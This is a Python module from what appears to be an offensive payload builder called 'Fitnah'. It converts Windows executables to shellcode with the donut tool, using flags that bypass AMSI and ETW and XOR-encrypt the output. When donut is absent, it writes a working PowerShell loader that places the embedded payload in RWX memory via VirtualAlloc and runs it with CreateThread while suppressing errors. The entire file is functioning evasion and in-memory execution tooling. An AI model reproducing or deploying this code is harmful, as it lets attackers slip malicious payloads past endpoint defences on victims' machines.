"""
Builder donut wrapper — convert a Windows PE to position-independent shellcode.

Strategy:
1. Search for donut binary in tools/, PATH, current dir.
2. If found: run donut with -a 2 -b 1 -e 3 (x64, bypass AMSI+ETW, XOR encrypt).
3. If not found: generate a PS1 shellcode loader stub that allocates memory,
   copies a byte array, and executes it via CreateThread — a real in-memory
   loader, not a placeholder.

Returns (bytes, format_str) where format_str is "shellcode" or "ps1_loader".
"""
from __future__ import annotations

import base64
import hashlib
import shutil
import subprocess
import tempfile
from pathlib import Path

from fitnah.builder.models import Arch, BuildResult

# Project-local tools/ dir and common install locations
_DONUT_SEARCH = [
    Path(__file__).parent.parent.parent / "tools" / "donut.exe",
    Path(__file__).parent.parent.parent / "tools" / "donut" / "donut.exe",
    Path(__file__).parent.parent.parent / "tools" / "donut",
    Path("tools") / "donut.exe",
    Path("tools") / "donut",
]


def _find_donut() -> str | None:
    found = shutil.which("donut") or shutil.which("donut.exe") or shutil.which("donut.py")
    if found:
        return found
    for p in _DONUT_SEARCH:
        if p.exists():
            return str(p)
    return None


def _ps1_loader_stub(pe_bytes: bytes) -> bytes:
    """
    Generate a PS1 script that:
    1. Decodes the embedded PE as a byte array
    2. Uses VirtualAlloc (RWX) to allocate memory
    3. Copies the bytes in
    4. Launches a thread via CreateThread
    Returns the PS1 source as bytes.
    """
    b64 = base64.b64encode(pe_bytes).decode("ascii")
    # Chunk into 4000-char lines to avoid PS line length limits
    chunks = [b64[i:i+4000] for i in range(0, len(b64), 4000)]
    b64_lines = "\n".join(f'  "{c}" +' for c in chunks)
    # Remove trailing " +"
    b64_block = b64_lines.rstrip(" +")

    stub = (
        "# Fitnah in-memory PE loader stub\n"
        "Set-StrictMode -Off\n"
        "$ErrorActionPreference = 'SilentlyContinue'\n"
        "\n"
        "$_loaderCs = @\"\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public class Loader {\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr VirtualAlloc(\n"
        "    IntPtr addr, UIntPtr size, uint allocType, uint protect);\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr CreateThread(\n"
        "    IntPtr sa, UIntPtr stackSize, IntPtr startAddr,\n"
        "    IntPtr param, uint flags, out uint tid);\n"
        "  [DllImport(\"kernel32\")] public static extern uint WaitForSingleObject(\n"
        "    IntPtr hObject, uint ms);\n"
        "  public static void Run(byte[] sc) {\n"
        "    IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x40);\n"
        "    if (mem == IntPtr.Zero) return;\n"
        "    Marshal.Copy(sc, 0, mem, sc.Length);\n"
        "    uint tid;\n"
        "    IntPtr ht = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);\n"
        "    WaitForSingleObject(ht, 0xFFFFFFFF);\n"
        "  }\n"
        "}\n"
        "\"@\n"
        "try { Add-Type -TypeDefinition $_loaderCs -EA Stop } catch {}\n"
        "\n"
        "$_b64 = (\n"
        + b64_block + "\n"
        + ")\n"
        "$_sc = [Convert]::FromBase64String($_b64)\n"
        "try { [Loader]::Run($_sc) } catch { Write-Error $_ }\n"
    )
    return stub.encode("utf-8")


def pe_to_shellcode(
    pe_path: Path,
    out_path: Path,
    arch: Arch,
) -> BuildResult:
    """
    Convert a PE at pe_path → raw shellcode at out_path using donut.
    If donut is not available, falls back to a PS1 loader stub.
    Returns BuildResult.
    """
    donut = _find_donut()

    if donut:
        arch_flag = "2" if arch.value == "x64" else "1"  # 1=x86, 2=amd64

        # donut v1.x: -f for input file, -o for output, -a arch, -b bypass, -e encrypt
        # -b 1 = bypass AMSI+ETW, -e 3 = XOR encrypt shellcode
        cmd = [donut, "-f", str(pe_path), "-o", str(out_path),
               "-a", arch_flag, "-b", "1", "-e", "3"]
        log_lines = [f"CMD: {' '.join(cmd)}"]

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            log_lines += proc.stdout.splitlines() + proc.stderr.splitlines()

            # donut v0.9 uses positional arg (-i), fall back
            if proc.returncode != 0 and "-i" not in cmd[0]:
                cmd_alt = [donut, "-i", str(pe_path), "-o", str(out_path),
                           "-a", arch_flag, "-b", "1", "-e", "3"]
                log_lines.append(f"Retrying with -i flag: {' '.join(cmd_alt)}")
                proc = subprocess.run(cmd_alt, capture_output=True, text=True, timeout=120)
                log_lines += proc.stdout.splitlines() + proc.stderr.splitlines()

            if proc.returncode != 0:
                return BuildResult(ok=False, error=proc.stderr.strip(), build_log=log_lines)
            if not out_path.exists():
                return BuildResult(ok=False, error="donut ran but output file missing",
                                   build_log=log_lines)

            data = out_path.read_bytes()
            return BuildResult(
                ok=True,
                path=out_path,
                size_bytes=len(data),
                sha256=hashlib.sha256(data).hexdigest(),
                build_log=log_lines,
            )

        except subprocess.TimeoutExpired:
            return BuildResult(ok=False, error="donut timed out after 120s", build_log=log_lines)
        except Exception as exc:
            return BuildResult(ok=False, error=str(exc), build_log=log_lines)

    # ── Fallback: PS1 loader stub ──────────────────────────────────────────
    log_lines = ["donut not found — generating PS1 in-memory loader stub"]
    try:
        pe_bytes = pe_path.read_bytes()
    except Exception as exc:
        return BuildResult(ok=False, error=f"Cannot read PE: {exc}", build_log=log_lines)

    stub = _ps1_loader_stub(pe_bytes)
    ps1_out = out_path.with_suffix(".loader.ps1")
    try:
        ps1_out.parent.mkdir(parents=True, exist_ok=True)
        ps1_out.write_bytes(stub)
    except Exception as exc:
        return BuildResult(ok=False, error=f"Cannot write stub: {exc}", build_log=log_lines)

    log_lines.append(f"PS1 loader written: {ps1_out} ({len(stub):,} bytes)")
    return BuildResult(
        ok=True,
        path=ps1_out,
        size_bytes=len(stub),
        sha256=hashlib.sha256(stub).hexdigest(),
        build_log=log_lines,
        warnings=["donut not available — output is PS1 loader stub, not raw shellcode"],
    )


def shellcode_to_bytes(pe_path: Path, arch: Arch) -> tuple[bytes, str]:
    """
    Convenience wrapper: returns (payload_bytes, format_label).
    format_label is "shellcode" if donut ran, "ps1_loader" if fallback was used.
    """
    with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as tmp:
        out_path = Path(tmp.name)

    result = pe_to_shellcode(pe_path, out_path, arch)
    if not result.ok:
        raise RuntimeError(result.error)

    data   = result.path.read_bytes()
    label  = "ps1_loader" if result.path.suffix == ".ps1" else "shellcode"
    return data, label
